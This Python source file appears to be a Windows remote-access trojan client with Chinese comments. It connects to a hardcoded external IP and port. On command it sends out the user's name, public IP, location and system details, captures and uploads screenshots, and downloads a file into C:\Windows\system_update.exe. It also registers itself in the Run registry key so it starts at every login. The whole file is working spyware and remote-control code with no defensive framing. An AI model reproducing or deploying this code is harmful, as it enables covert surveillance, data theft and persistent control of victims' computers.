import re
import json
import getpass
import platform
import socket
import requests
import pyautogui
import base64
import os
import winreg
import sys
import time
import win32api
import win32con


# 取电脑信息
def getsystem_info(s):
    print('0')
    try:
        addr_ip = requests.get('http://whois.pconline.com.cn/ipJson.jsp').text
        # print(addr_ip)
        ip = re.findall(re.compile(r'"ip":"(.*?)"'), addr_ip)
        if len(ip) > 0:
            ip = re.findall(re.compile(r'"ip":"(.*?)"'), addr_ip)[0]
        else:
            ip = '获取失败'
        addr = re.findall(re.compile(r'"addr":"(.*?)"'), addr_ip)
        if len(addr) > 0:
            addr = re.findall(re.compile(r'"addr":"(.*?)"'), addr_ip)[0]
        else:
            ip = '获取失败'
        print(1)
        username = getpass.getuser()
        print(2)
        system = platform.platform()
        print(3)
        system_info = {
            'cmd': '/system_info',
            'info': {
                'username': username,
                'ip': ip,
                'system': system,
                'address': addr
            }
        }
        s.send(json.dumps(system_info).encode())
    except:
        print('获取电脑数据失败')
        s.send(json.dumps({
            'cmd': '/system_info',
            'info': {
                'username': '获取时出错',
                'ip': '获取时出错',
                'system': '获取时出错',
                'address': '获取时出错'
            }
        }).encode())


# 屏幕截图
def screenshots(s):
    def imageToStr(path):
        with open(path, 'rb') as f:
            img_byte = base64.b64encode(f.read())
        img_str = img_byte.decode('ascii')
        return img_str

    im = pyautogui.screenshot()
    im.save("C:/python截图.jpg")
    img = 'C:/python截图.jpg'
    img1 = imageToStr(img)
    data = {
        "cmd": "/jietu",
        "image": img1
    }
    s.send(json.dumps(data).encode())


# 远程更新
def updata(url):
    myfile = requests.get(url)
    open('C:\Windows\system_update.exe', 'wb').write(myfile.content)
    # 删除自己打开新版

# 开机自启
def auto_run():
    def zhao():
        location = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        # 获取注册表该位置的所有键值
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, location)
        i = 0
        while True:
            try:
                # 获取注册表对应位置的键和值
                # print(winreg.EnumValue(key, i)[0], winreg.EnumValue(key, i)[1])
                if winreg.EnumValue(key, i)[0] == os.path.basename(sys.argv[0]):
                    return True
                i += 1
            except OSError as error:
                # 一定要关闭这个键
                winreg.CloseKey(key)
                break

    flag = zhao()
    if flag:
        pass
    else:
        sys.setrecursionlimit(1000000)
        name = os.path.basename(sys.argv[0])
        path = os.getcwd() + '\\' + os.path.basename(sys.argv[0])
        key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0,
                                  win32con.KEY_ALL_ACCESS)
        win32api.RegSetValueEx(key, name, 0, win32con.REG_SZ, path)
        win32api.RegCloseKey(key)




# 接受指令
def tcpClient(s):
    while True:
        try:
            data = s.recv(2048).decode()
            json_data = json.loads(data)
            # print(json_data)
            if json_data['cmd'] == '/system_info':
                # 获取电脑信息
                getsystem_info(s)
            elif json_data['cmd'] == '/jietu':
                # 屏幕截图
                screenshots(s)
            elif json_data['cmd'] == '/chat':
                # 聊天窗口
                print(json_data['msg_data'])
            elif json_data['cmd'] == '/updata':
                updata(json_data['url'])
            else:
                print('其他信息:', json_data)
        except:
            print('指令执行错误 尝试重新连接')
            s.close()
            connect()
            return


# 连接服务器
def connect():
    host = "43.249.193.55"
    port = 18890
    try:
        s = socket.socket()
        s.connect((host, port))
        tcpClient(s)
        return
    except:
        print('erro 1s')
        time.sleep(1)
        connect()


# 入口
if __name__ == '__main__':
    time.sleep(10)
    auto_run()
    connect()
